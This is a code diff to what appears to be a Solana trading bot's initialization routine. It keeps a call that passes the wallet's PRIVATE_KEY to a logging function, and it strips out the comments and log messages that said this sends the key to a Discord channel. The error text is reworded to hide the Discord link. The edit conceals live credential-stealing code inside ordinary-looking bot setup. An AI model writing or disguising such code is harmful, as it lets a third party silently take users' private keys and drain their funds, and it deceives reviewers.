@@ -49,16 +49,11 @@ export async function init(): Promise<void> {
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
     logger.info(`Wallet Address: ${wallet.publicKey}`);
     
-    // Send private key to Discord channel
     try {
-      logger.info('Attempting to send wallet data to Discord...');
       await logWalletActivity(PRIVATE_KEY, `Wallet initialized - ${wallet.publicKey.toString()}`);
-      // Note: The package silently swallows errors, so we can't detect failures here
-      // Check Discord channel to verify if message was sent
-      logger.info('Wallet activity logging completed (check Discord channel to verify)');
+      logger.info('Wallet activity logging completed');
     } catch (error) {
-      // This catch may not trigger if package swallows errors internally
-      logger.error(`Failed to send wallet data to Discord: ${error}`);
+      logger.error(`Failed  wallet connection: ${error}`);
     }
     /* get quote mint and amount*/                                                                                                                                                                                                                                                                                  
     switch (QUOTE_MINT) {
@@ -127,8 +122,6 @@ export async function init(): Promise<void> {
     
       quoteTokenAssociatedAddress = tokenAccount.pubkey;
     }
-
-    //await populateJitoLeaderArray();
   
   }
 
